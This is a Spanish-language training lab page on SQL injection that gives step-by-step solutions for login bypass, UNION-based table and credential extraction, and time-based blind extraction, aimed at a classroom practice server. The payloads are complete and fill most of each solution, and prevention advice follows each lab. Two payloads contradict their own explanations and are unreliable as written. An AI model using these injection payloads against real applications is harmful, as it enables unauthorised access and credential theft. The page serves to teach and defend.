---
title: "Lab - SQL Injection (SQLi)"
date: "2026-10-08"
author: "Manuel FR"
tags:
  - ifct0109
  - poc
  - vulnerabilidades-web
  - web
  - vulnweb
  - sqli
---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]

---
# Lab - SQL Injection (SQLi)

# 💉 SQL Injection (SQLi)

 

## Aprende a explotar y prevenir inyecciones SQL

 
 
 

## 📚 ¿Qué es SQL Injection?

 

 **SQL Injection (SQLi)** es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación hace a su base de datos. Generalmente ocurre cuando el input del usuario se concatena directamente en consultas SQL sin validación o sanitización adecuada.
 
 

 Esta vulnerabilidad puede permitir a un atacante visualizar datos que normalmente no podría recuperar (usuarios, contraseñas, datos sensibles), modificar o eliminar datos, y en algunos casos ejecutar comandos administrativos en el servidor de base de datos.
 
 

> [!note]
> 
 **💡 Impacto:** SQL Injection ha sido clasificada consistentemente entre las vulnerabilidades más críticas según el OWASP Top 10. Puede llevar a la filtración completa de datos, modificación de información sensible, o incluso compromiso total del servidor.
> 

 

 
 
 

## 🧪 Laboratorios Prácticos

 

Completa estos laboratorios progresivos para dominar la explotación de SQL Injection:

 
 
 

### Lab 1: Login Bypass - Autenticación Vulnerable

 FÁCIL
 
 
 

 Sistema de login bancario que valida credenciales contra una base de datos. Los campos de usuario y contraseña son vulnerables a SQL Injection, permitiendo bypassear la autenticación sin conocer las credenciales reales.
 
 
 
 **🎯 Objetivo:** Bypassear el sistema de login usando SQL Injection para acceder como administrador y obtener la FLAG.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 💡 Ver Solución
 ▼
 
 
 

#### Solución Paso a Paso:

 
 

**Paso 1: Entender la Query SQL**
 

El código vulnerable construye la query de esta manera:
 
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
 
 

Si introduces credenciales normales como `admin` / `password123`, la query sería:
 
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
 

 

**Paso 2: Payload Básico - Comilla Simple**
 

Primero, prueba a romper la query con una comilla simple:
 
Usuario: admin'

Contraseña: cualquiera
 
 

La query se convierte en:
 
SELECT * FROM users WHERE username = 'admin'' AND password = 'cualquiera'
 
 

**Resultado:** Error SQL que confirma la vulnerabilidad.

 

**Paso 3: Bypass con OR 1=1**
 

Usa una condición siempre verdadera para bypassear la autenticación:
 
Usuario: admin' OR '1'='1

Contraseña: (dejar vacío o cualquier cosa)
 
 

La query se convierte en:
 
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''
 
 

Como `'1'='1'` es siempre verdadero, la query devuelve el usuario admin.
 

**Resultado:** ✅ Login exitoso + FLAG mostrada

 

**Paso 4: Bypass con Comentarios (Método Alternativo)**
 

Usa comentarios SQL para ignorar la validación de contraseña:
 
Usuario: admin'--

Contraseña: (cualquier cosa, se ignora)
 
 

La query se convierte en:
 
SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
 
 

El `--` comenta todo lo que viene después, eliminando la validación de contraseña.
 

**Resultado:** ✅ Login exitoso como admin

 

**Paso 5: Otras Variantes**
 

Prueba estos payloads alternativos:
 
# Usando comentarios 

admin'#

admin'--

admin'-- 

admin'-- -

admin'--+-

# Bypass alternativo

admin' OR 1=1--

# Bypass sin conocer usuario, probar añadiendo un espacio al final

' OR '1'='1'--

# Bypass con UNION (avanzado)

' UNION SELECT NULL, 'admin', 'fake', NULL, 'admin'--
 

 

#### Resumen de Payloads:

 
 
 
 
 
 
 `admin' OR '1'='1`
 
 
 
 `admin'--`
 
 
 
 `admin'#`
 
 
 
 `' OR 1=1--`
 
 
 
 `admin' OR '1'='1'--`
 
 
 

| Payload | Descripción |
| --- | --- |
| | Condición siempre verdadera |
| | Comentario que ignora la password |
| | Comentario MySQL alternativo |
| | Bypass sin conocer el usuario |
| | Combinación de ambas técnicas |

 

> [!note]
> 
 **🔍 ¿Por qué funciona?**
> 
 El código concatena directamente el input del usuario en la query SQL:
> 
> $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
> 

 Al introducir `admin' OR '1'='1`, la condición del WHERE se modifica, haciendo que siempre sea verdadera y devuelva el primer usuario (admin).
 

 

#### Conceptos Clave Aprendidos:

 

 
* **Login Bypass:** Técnica para acceder sin credenciales válidas
 
* **OR 1=1:** Condición siempre verdadera que bypasea lógica
 
* **Comentarios SQL:** `--` y `#` eliminan el resto de la query
 
* **Manipulación lógica:** Alterar condiciones WHERE para controlar resultados
 

 

#### Prevención:

 

Usar Prepared Statements es la solución definitiva:
 
// SOLUCIÓN SEGURA:

$stmt = $conn->prepare("SELECT * FROM users WHERE username =? AND password =?");

$stmt->bind_param("ss", $username, $password);

$stmt->execute();

$result = $stmt->get_result();
 
 

Otras medidas:
 

 
* Validar formato de usuario (solo alfanuméricos)
 
* Hash de contraseñas (bcrypt, argon2)
 
* Rate limiting (limitar intentos de login)
 
* Autenticación de dos factores (2FA)
 
* Logs de intentos fallidos
 

 
 
 

 
 
 

### Lab 2: UNION-based SQLi - Búsqueda de Productos

 MEDIO
 
 
 

 Tienda online con búsqueda de productos por ID. El parámetro `id` es vulnerable a SQL Injection, permitiendo usar UNION SELECT para extraer datos de otras tablas.
 
 
 
 **🎯 Objetivo:** Extraer la FLAG de la tabla `secrets` usando técnicas de UNION-based SQL Injection.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 
 📚 Conceptos Previos - MySQL
 ▼
 
 
 

#### 📚 Conceptos Previos - Trabajar con MySQL

 

Antes de explotar la vulnerabilidad, es importante entender cómo funcionan las bases de datos SQL. Vamos a conectarnos a la base de datos del laboratorio y explorarla manualmente desde tu máquina.
 
 

#### 1. Conectarse a MySQL desde tu máquina

 
 

**⚠️ Importante:** La base de datos MySQL está corriendo en el servidor del profesor. Debes conectarte usando el DNS `vulnweb.local`.
 
 

**Conexión desde tu máquina:**
 
# Conectarse a MySQL del laboratorio

mysql -h vulnweb.local -P 3306 -u vulnweb_user -pvulnweb_pass vulnweb_sqli

# Parámetros:

# -h vulnweb.local: DNS del servidor donde corre el Docker

# -P 3306: Puerto MySQL

# -u vulnweb_user: Usuario de la base de datos

# -pvulnweb_pass: Contraseña (sin espacio después de -p)

# vulnweb_sqli: Nombre de la base de datos
 
 
 

**Si no tienes el cliente MySQL instalado:**
 
# Linux (Debian/Ubuntu)

sudo apt install mysql-client

# Linux (Fedora/RHEL)

sudo dnf install mysql

# macOS

brew install mysql-client

# Windows

# Descarga MySQL Workbench desde:

# https://dev.mysql.com/downloads/workbench/
 
 
 

**Verificar conectividad antes de conectar:**
 
# Comprobar que el puerto 3306 está abierto

telnet vulnweb.local 3306

# O con netcat

nc -zv vulnweb.local 3306

# Resultado esperado:

# Connection to vulnweb.local 3306 port [tcp/mysql] succeeded!
 
 
 

#### 2. Comandos de Bases de Datos

 
 

**Listar todas las bases de datos:**
 
mysql> SHOW DATABASES;
 
 

**Resultado esperado:**
 
+--------------------+

| Database |

+--------------------+

| information_schema |

| mysql |

| performance_schema |

| vulnweb_sqli | ← Nuestra base de datos

+--------------------+
 
 
 

**Seleccionar una base de datos:**
 
mysql> USE vulnweb_sqli;
 
 
 

#### 3. Comandos de Tablas

 
 

**Listar todas las tablas:**
 
mysql> SHOW TABLES;
 
 

**Resultado esperado:**
 
+------------------------+

| Tables_in_vulnweb_sqli |

+------------------------+

| products | ← Tabla de productos

| users | ← Tabla de usuarios

| secrets | ← Tabla con la FLAG

+------------------------+
 
 
 

**Ver la estructura de una tabla:**
 
mysql> DESCRIBE products;
 
 

**Resultado esperado:**
 
+-------------+--------------+------+-----+---------+----------------+

| Field | Type | Null | Key | Default | Extra |

+-------------+--------------+------+-----+---------+----------------+

| id | int(11) | NO | PRI | NULL | auto_increment |

| name | varchar(100) | NO | | NULL | |

| description | text | YES | | NULL | |

| price | decimal(10,2)| NO | | NULL | |

| category | varchar(50) | YES | | NULL | |

| stock | int(11) | YES | | 0 | |

| image | varchar(100) | YES | | NULL | |

+-------------+--------------+------+-----+---------+----------------+
 
 
 

#### 4. Operaciones SQL Básicas

 
 

**SELECT - Consultar datos:**
 
# Seleccionar todo de la tabla products

mysql> SELECT * FROM products;

# Seleccionar columnas específicas

mysql> SELECT id, name, price FROM products;

# Seleccionar con condición

mysql> SELECT * FROM products WHERE id = 1;

mysql> SELECT * FROM products WHERE category = 'Laptops';
 
 
 

**INSERT - Insertar datos:**
 
mysql> INSERT INTO products (name, price, category, stock) 

 VALUES ('Nuevo Producto', 99.99, 'Test', 10);
 
 
 

**UPDATE - Modificar datos:**
 
# Cambiar precio de un producto

mysql> UPDATE products SET price = 599.99 WHERE id = 1;

# Cambiar stock de productos con stock bajo

mysql> UPDATE products SET stock = 100 WHERE stock < 10;
 
 
 

**DELETE - Borrar datos:**
 
mysql> DELETE FROM products WHERE id = 10;
 
 
 

**ALTER TABLE - Modificar estructura:**
 
# Añadir nueva columna

mysql> ALTER TABLE products ADD discount INT;

# Eliminar columna

mysql> ALTER TABLE products DROP COLUMN discount;
 
 
 

**DROP TABLE - Eliminar tabla completa:**
 
mysql> DROP TABLE products; ⚠️ ¡Cuidado! Borra toda la tabla
 
 
 

#### 5. Filtros y Ordenamiento

 
 

**ORDER BY - Ordenar resultados:**
 
# Ordenar por precio ascendente

mysql> SELECT * FROM products ORDER BY price ASC;

# Ordenar por precio descendente

mysql> SELECT * FROM products ORDER BY price DESC;

# Ordenar por nombre alfabéticamente

mysql> SELECT * FROM products ORDER BY name;
 
 
 

**WHERE - Filtrar con condiciones:**
 
# Productos con precio mayor a 500

mysql> SELECT * FROM products WHERE price > 500;

# Productos de categoría específica

mysql> SELECT * FROM products WHERE category = 'Laptops';

# Múltiples condiciones con AND

mysql> SELECT * FROM products WHERE price > 100 AND stock > 5;

# Múltiples condiciones con OR

mysql> SELECT * FROM products WHERE category = 'Laptops' OR category = 'Audio';
 
 
 

**LIKE - Búsqueda con patrones:**
 
# Productos que empiezan con 'Mouse'

mysql> SELECT * FROM products WHERE name LIKE 'Mouse%';

# Productos que contienen 'USB'

mysql> SELECT * FROM products WHERE name LIKE '%USB%';

# Productos que terminan con '3'

mysql> SELECT * FROM products WHERE name LIKE '%3';

# % = cualquier cantidad de caracteres (equivalente a *)

# _ = un solo carácter
 
 
 

**LIMIT - Limitar número de resultados:**
 
# Mostrar solo los primeros 3 productos

mysql> SELECT * FROM products LIMIT 3;

# Mostrar 5 productos a partir del producto 10 (paginación)

mysql> SELECT * FROM products LIMIT 10, 5;
 
 
 

#### 6. Funciones de Agregación

 
 
# Contar productos

mysql> SELECT COUNT(*) FROM products;

# Precio máximo

mysql> SELECT MAX(price) FROM products;

# Precio mínimo

mysql> SELECT MIN(price) FROM products;

# Precio promedio

mysql> SELECT AVG(price) FROM products;

# Suma total de stock

mysql> SELECT SUM(stock) FROM products;
 
 
 

#### 7. Práctica Recomendada - Explorar la Base de Datos

 
 

Antes de intentar el exploit, conecta y explora manualmente desde tu máquina:
 
 
**# 1. Conectarse desde tu máquina**

mysql -h vulnweb.local -P 3306 -u vulnweb_user -pvulnweb_pass vulnweb_sqli

**# 2. Ver todas las bases de datos disponibles**

mysql> SHOW DATABASES;

**# 3. Seleccionar la base de datos del laboratorio**

mysql> USE vulnweb_sqli;

**# 4. Ver tablas disponibles**

mysql> SHOW TABLES;

**# 5. Explorar tabla products**

mysql> DESCRIBE products;

mysql> SELECT * FROM products;

**# 6. Explorar tabla secrets (¡aquí está la FLAG!)**

mysql> DESCRIBE secrets;

mysql> SELECT * FROM secrets;

**# 7. Contar columnas de products (necesario para UNION)**

mysql> SELECT * FROM products WHERE id = 1;

# Observa cuántas columnas devuelve: 7 columnas

**# 8. Salir de MySQL**

mysql> exit;
 
 
 

> [!note]
> 
 **💡 Consejo:** Explorar la base de datos manualmente ANTES del exploit te ayuda a:
> 
 - Entender la estructura de las tablas
> 
 - Saber qué columnas existen y sus tipos
> 
 - Ver dónde está la información que buscas
> 
 - Planificar mejor tu ataque UNION SELECT
> 
 - Familiarizarte con las queries SQL básicas
> 

 
 

**🔧 Alternativa: MySQL Workbench (GUI)**
 

Si prefieres una interfaz gráfica en lugar de línea de comandos:
 
1. Descarga MySQL Workbench

2. Nueva Conexión → Introduce los datos:

 - Connection Name: VulnWeb Lab

 - Hostname: vulnweb.local

 - Port: 3306

 - Username: vulnweb_user

 - Password: vulnweb_pass

 - Default Schema: vulnweb_sqli

3. Test Connection

4. Explora las tablas visualmente
 
 
 
 
 
 
 
 💡 Ver Solución
 ▼
 
 
 

#### Solución Paso a Paso del Exploit:

 
 

**Paso 1: Acceso Normal**
 

Primero, prueba la funcionalidad legítima:
 
lab2.php?id=1
 
 

Verás el producto "Laptop HP Pavilion 15". La query ejecutada es:
 
SELECT * FROM products WHERE id = 1
 

 

**Paso 2: Detectar la Vulnerabilidad**
 

Añade una comilla simple para romper la query SQL:
 
lab2.php?id=1'
 
 

**Resultado esperado:** Error SQL como:
 
You have an error in your SQL syntax...
 
 

Esto confirma que el parámetro `id` es vulnerable a SQL Injection.

 

**Paso 3: Determinar el Número de Columnas**
 

Usa ORDER BY para contar cuántas columnas devuelve la query original:
 
lab2.php?id=1 ORDER BY 1--

lab2.php?id=1 ORDER BY 2--

lab2.php?id=1 ORDER BY 3--

...

lab2.php?id=1 ORDER BY 7-- ✓ Funciona

lab2.php?id=1 ORDER BY 8-- ❌ Error
 
 

**Conclusión:** La query tiene 7 columnas.
 

La query se convierte en:
 
SELECT * FROM products WHERE id = 1 ORDER BY 7--
 

 

**Paso 4: Identificar Columnas Visibles**
 

Usa UNION SELECT con el mismo número de columnas (7) para ver cuáles se muestran:
 
lab2.php?id=999 UNION SELECT 1,2,3,4,5,6,7--
 
 

Usamos `id=999` (un ID que no existe) para que solo se muestren los resultados del UNION.
 

**Resultado:** Verás números en la página. Las columnas visibles son: **2, 3, 4, 5, 6**
 

La query se convierte en:
 
SELECT * FROM products WHERE id = 999 UNION SELECT 1,2,3,4,5,6,7--
 

 

**Paso 5: Enumerar la Base de Datos**
 

Obtén el nombre de la base de datos actual:
 
lab2.php?id=999 UNION SELECT 1,database(),3,4,5,6,7--
 
 

**Resultado:** Verás `vulnweb_sqli` en lugar del número 2.
 

Esto confirma que estamos trabajando con la base de datos `vulnweb_sqli`.

 

**Paso 6: Enumerar Tablas**
 

Lista todas las tablas de la base de datos usando `information_schema.tables`:
 
lab2.php?id=999 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema='vulnweb_sqli'--
 
 

**Resultado:** Verás tres tablas:
 

 
* products (la tabla actual)
 
* users (tabla de usuarios)
 
* **secrets** (🎯 aquí está la FLAG)
 

 

Si solo muestra una tabla, usa `GROUP_CONCAT` para verlas todas:
 
lab2.php?id=999 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema='vulnweb_sqli'--
 
 

**Resultado:** `products,users,secrets`

 

**Paso 7: Enumerar Columnas de la Tabla secrets**
 

Descubre qué columnas tiene la tabla `secrets`:
 
lab2.php?id=999 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='secrets'--
 
 

**Resultado:** Columnas de la tabla secrets:
 

 
* id
 
* secret_name
 
* secret_value
 

 

Si solo muestra una columna, usa GROUP_CONCAT:
 
lab2.php?id=999 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_name='secrets'--
 
 

**Resultado:** `id,secret_name,secret_value`

 

**Paso 8: Extraer la FLAG**
 

Ahora que sabemos que la tabla es `secrets` y las columnas son `secret_name` y `secret_value`, extraemos los datos:
 
lab2.php?id=999 UNION SELECT 1,secret_name,secret_value,4,5,6,7 FROM secrets--
 
 

**Resultado:** Verás la FLAG:
 

> [!note]
> 
**🎉 FLAG CAPTURADA:**
> 
FLAG{UN10N_S3L3CT_M4ST3R}
> 

 

**Paso 9 (Bonus): Extraer Usuarios y Contraseñas**
 

También puedes extraer datos de la tabla `users`:
 
# Ver columnas de users

lab2.php?id=999 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_name='users'--

# Extraer usuarios y contraseñas

lab2.php?id=999 UNION SELECT 1,username,password,role,5,6,7 FROM users--

# Ver todos los usuarios en una sola línea

lab2.php?id=999 UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4,5,6,7 FROM users--
 

 

#### Resumen de Payloads - Lab 2:

 
 
 
 
 
 
 
 
 `lab2.php?id=1`
 
 
 
 
 `lab2.php?id=1'`
 
 
 
 
 `lab2.php?id=1 ORDER BY 7--`
 
 
 
 
 `lab2.php?id=999 UNION SELECT 1,2,3,4,5,6,7--`
 
 
 
 
 `lab2.php?id=999 UNION SELECT 1,database(),3,4,5,6,7--`
 
 
 
 
 `lab2.php?id=999 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema='vulnweb_sqli'--`
 
 
 
 
 `lab2.php?id=999 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_name='secrets'--`
 
 
 
 
 `lab2.php?id=999 UNION SELECT 1,secret_name,secret_value,4,5,6,7 FROM secrets--`
 
 
 
 
 `lab2.php?id=999 UNION SELECT 1,username,password,role,5,6,7 FROM users--`
 
 
 

| Paso | Payload | Objetivo |
| --- | --- | --- |
| 1 | | Acceso normal |
| 2 | | Detectar vulnerabilidad (error SQL) |
| 3 | | Determinar número de columnas (7) |
| 4 | | Identificar columnas visibles |
| 5 | | Obtener nombre BD (vulnweb_sqli) |
| 6 | | Enumerar tablas |
| 7 | | Enumerar columnas de secrets |
| 8 | | 🎯 Extraer FLAG |
| 9 | | Bonus: Extraer usuarios |

 

> [!note]
> 
 **🔍 ¿Por qué funciona UNION SELECT?**
> 
 UNION permite combinar los resultados de dos queries SELECT. Para que funcione:
> 
 1. Ambas queries deben tener el **mismo número de columnas** (por eso usamos ORDER BY)
> 
 2. Los tipos de datos deben ser compatibles
> 
 3. Usamos `id=999` para que la primera query no devuelva nada y solo veamos los datos del UNION
> 

 

#### Conceptos Clave Aprendidos:

 

 
* **UNION SELECT:** Combinar queries para extraer datos de otras tablas
 
* **ORDER BY:** Técnica para determinar el número de columnas
 
* **information_schema:** Base de datos de metadatos (tablas, columnas)
 
* **GROUP_CONCAT:** Agrupar múltiples resultados en una sola línea
 
* **Comentarios SQL:** `--` para ignorar el resto de la query
 

 

#### Prevención:

 

Usar Prepared Statements es la solución definitiva:
 
// CÓDIGO VULNERABLE:

$sql = "SELECT * FROM products WHERE id = $product_id";

// SOLUCIÓN SEGURA:

$stmt = $conn->prepare("SELECT * FROM products WHERE id =?");

$stmt->bind_param("i", $product_id);

$stmt->execute();

$result = $stmt->get_result();
 
 

Otras medidas:
 

 
* Validar y sanitizar todos los inputs
 
* Usar ORM (Object-Relational Mapping)
 
* Principio de menor privilegio en BD
 
* WAF (Web Application Firewall)
 
* Logs y monitoreo de queries SQL
 

 
 
 

 
 
 

### Lab 3: Blind SQLi Time-based - Extracción de Credenciales

 DIFÍCIL
 
 
 

 Sistema de verificación de usuarios que solo muestra si un usuario existe o no, sin mostrar errores SQL ni datos. La vulnerabilidad permite extraer información usando técnicas de Time-based Blind SQL Injection con la función `SLEEP()`.
 
 
 
 **🎯 Objetivo:** Extraer el **username** y **password** del usuario con `id=1` carácter por carácter usando `SLEEP()` para confirmar cada letra.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 
 💡 Ver Solución
 ▼
 
 
 

#### 📚 ¿Qué es Blind SQL Injection?

 

Es una técnica de explotación cuando la aplicación **NO** muestra:
 

 
* Errores SQL
 
* Datos de la base de datos
 
* Diferencias visibles entre consultas verdaderas o falsas
 

 

Solo muestra mensajes genéricos como "Usuario encontrado" o "Usuario no encontrado".
 
 

> [!note]
> 
 **💡 Técnica Time-based:** Usamos la función `SLEEP()` para crear retrasos perceptibles:
> 

> 
> * Si la condición es TRUE → `SLEEP(3)` se ejecuta → Tarda 3+ segundos
> 
> * Si la condición es FALSE → No hay SLEEP → Tarda < 100 ms
> 

> Midiendo el tiempo de respuesta, podemos extraer información carácter por carácter.
> 

 
 

#### Solución Paso a Paso:

 
 

**Datos a extraer del usuario id=1:**
 

 
* username: `admin` (5 caracteres)
 
* password: `admin123!` (9 caracteres)
 

 
 

#### Paso 1: Probar la Vulnerabilidad

 
 

**1.1 Acceso normal:**
 
lab3.php?id=1
 
 

**Resultado esperado:**
 

 
* Mensaje: "✓ Usuario encontrado"
 
* Tiempo: < 100 ms
 

 
 

**1.2 Provocar SLEEP básico:**
 
lab3.php?id=1 AND SLEEP(3)--
 
 

**Resultado esperado:**
 

 
* Mensaje: "✓ Usuario encontrado"
 
* Tiempo: **≥ 3000 ms** (3+ segundos)
 
* **Conclusión:** ✅ ¡Vulnerable a Time-based Blind SQLi!
 

 

La query se convierte en:
 
SELECT * FROM users WHERE id = 1 AND SLEEP(3)--
 
 
 

#### Paso 2: Determinar Longitud del Username

 
 

**2.1 ¿El username tiene 5 caracteres?**
 
lab3.php?id=1 AND IF(LENGTH((SELECT username FROM users WHERE id=1))=5,SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: **≥ 3000 ms**
 
* **Conclusión:** ✅ SÍ, el username tiene 5 caracteres
 

 
 

**2.2 ¿El username tiene 6 caracteres? (confirmar)**
 
lab3.php?id=1 AND IF(LENGTH((SELECT username FROM users WHERE id=1))=6,SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: < 100 ms (NO hay SLEEP)
 
* **Conclusión:** ✗ NO, el username NO tiene 6 caracteres
 

 
 

#### Paso 3: Extraer Username Carácter por Carácter

 
 

**3.1 Primer carácter = 'a'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a',SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: **≥ 3000 ms**
 
* **Conclusión:** ✅ El primer carácter es 'a'
 

 
 

**3.2 Primer carácter = 'b'? (confirmar que es 'a')**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='b',SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: < 100 ms (NO hay SLEEP)
 
* **Conclusión:** ✗ El primer carácter NO es 'b' (confirmado que es 'a')
 

 
 

**3.3 Segundo carácter = 'd'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT username FROM users WHERE id=1),2,1)='d',SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: **≥ 3000 ms**
 
* **Conclusión:** ✅ El segundo carácter es 'd'
 

 
 

**3.4 Tercer carácter = 'm'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT username FROM users WHERE id=1),3,1)='m',SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: **≥ 3000 ms**
 
* **Conclusión:** ✅ El tercer carácter es 'm'
 

 
 

**3.5 Cuarto carácter = 'i'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT username FROM users WHERE id=1),4,1)='i',SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: **≥ 3000 ms**
 
* **Conclusión:** ✅ El cuarto carácter es 'i'
 

 
 

**3.6 Quinto carácter = 'n'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT username FROM users WHERE id=1),5,1)='n',SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: **≥ 3000 ms**
 
* **Conclusión:** ✅ El quinto carácter es 'n'
 

 
 

> [!note]
> 
**🎉 USERNAME COMPLETO:** admin
> 

 
 

#### Paso 4: Determinar Longitud del Password

 
 

**4.1 ¿El password tiene 9 caracteres?**
 
lab3.php?id=1 AND IF(LENGTH((SELECT password FROM users WHERE id=1))=8,SLEEP(3),0)--
 
 

**Resultado esperado:**
 

 
* Tiempo: **≥ 3000 ms**
 
* **Conclusión:** ✅ SÍ, el password tiene 9 caracteres
 

 
 

#### Paso 5: Extraer Password Carácter por Carácter

 
 

**5.1 Primer carácter = 'a'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es 'a'
 
 

**5.2 Segundo carácter = 'd'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),2,1)='d',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es 'd'
 
 

**5.3 Tercer carácter = 'm'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),3,1)='m',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es 'm'
 
 

**5.4 Cuarto carácter = 'i'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),4,1)='i',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es 'i'
 
 

**5.5 Quinto carácter = 'n'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),5,1)='n',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es 'n'
 
 

**5.6 Sexto carácter = '1'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),6,1)='1',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es '1'
 
 

**5.7 Séptimo carácter = '2'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),7,1)='2',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es '2'
 
 

**5.8 Octavo carácter = '3'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),8,1)='3',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es '3'
 
 

**5.9 Noveno carácter = '!'?**
 
lab3.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),9,1)='3',SLEEP(3),0)--
 
 

**Resultado esperado:** Tiempo ≥ 3000 ms → ✅ Es '!'

 

> [!note]
> 
**🎉 PASSWORD COMPLETO:** admin123!
> 

 
 

#### Resumen de Payloads - Lab 3:

 
 
 
 
 
 
 
 
 
 `lab3.php?id=1 AND SLEEP(3)--`
 
 
 
 
 
 `lab3.php?id=1 AND IF(LENGTH((SELECT username FROM users WHERE id=1))=5,SLEEP(3),0)--`
 
 
 
 
 
 `lab3.php?id=1 AND IF(SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a',SLEEP(3),0)--`
 
 
 
 
 
 `lab3.php?id=1 AND IF(SUBSTRING((SELECT username FROM users WHERE id=1),2,1)='d',SLEEP(3),0)--`
 
 
 
 
 
 
 
 
 
 **Username: admin | Password: admin123!**
 
 

| Paso | Payload | Tiempo Esperado | Resultado |
| --- | --- | --- | --- |
| 1 | | ≥ 3000 ms | Vulnerable confirmado |
| 2 | | ≥ 3000 ms | Username tiene 5 caracteres |
| 3 | | ≥ 3000 ms | Primer carácter = 'a' |
| 4 | | ≥ 3000 ms | Segundo carácter = 'd' |
|... | Continuar con cada carácter hasta completar username y password | | |
| Final | | | |

 
 

#### Funciones SQL Usadas:

 
 

**LENGTH()** - Devuelve la longitud de una cadena:
 
LENGTH((SELECT username FROM users WHERE id=1))

# Devuelve: 5
 
 
 

**SUBSTRING()** - Extrae un substring:
 
SUBSTRING((SELECT username FROM users WHERE id=1), posición, longitud)

# Ejemplos:

SUBSTRING('admin', 1, 1) → 'a' # Primer carácter

SUBSTRING('admin', 2, 1) → 'd' # Segundo carácter

SUBSTRING('admin', 3, 1) → 'm' # Tercer carácter

# Nota: La posición empieza en 1, no en 0
 
 
 

**SLEEP()** - Pausa la ejecución:
 
SLEEP(3) # Pausa 3 segundos
 
 
 

**IF()** - Condicional:
 
IF(condición, valor_si_true, valor_si_false)

# Ejemplo:

IF(1=1, SLEEP(3), 0) # Si 1=1 (TRUE), ejecuta SLEEP(3)

IF(1=2, SLEEP(3), 0) # Si 1=2 (FALSE), ejecuta 0 (nada)
 
 
 

#### ⏱️ Interpretación de Tiempos:

 
 
 
 
 
 
 
 
 
 
 
 
 
 

| Tiempo de Respuesta | Significado |
| --- | --- |
| < 100 ms | Condición FALSE - El carácter NO es correcto ✗ |
| ≥ 3000 ms (3+ segundos) | Condición TRUE - El carácter ES correcto ✓ |

 
 

> [!note]
> 
 **🔍 ¿Por qué funciona?**
> 
 Cuando la condición del IF es verdadera, ejecuta SLEEP(3), causando un retraso de 3 segundos. Si es falsa, no ejecuta nada y la query termina inmediatamente. Midiendo el tiempo de respuesta, podemos determinar si cada carácter es correcto, extrayendo así toda la información carácter por carácter.
> 

 
 

#### Conceptos Clave Aprendidos:

 

 
* **Blind SQL Injection:** Extracción de datos sin ver resultados directos
 
* **Time-based:** Usar retrasos (SLEEP) para confirmar condiciones
 
* **Extracción gradual:** Obtener información carácter por carácter
 
* **LENGTH():** Determinar la longitud antes de extraer
 
* **SUBSTRING():** Extraer caracteres individuales
 
* **IF():** Ejecutar código condicionalmente
 

 
 

#### 💡 Tips para Practicar:

 

 
1. Observa siempre el tiempo de ejecución mostrado en la página
 
2. Empieza probando letras comunes (a, e, i, o, u)
 
3. Confirma cada carácter probando al menos 2 opciones
 
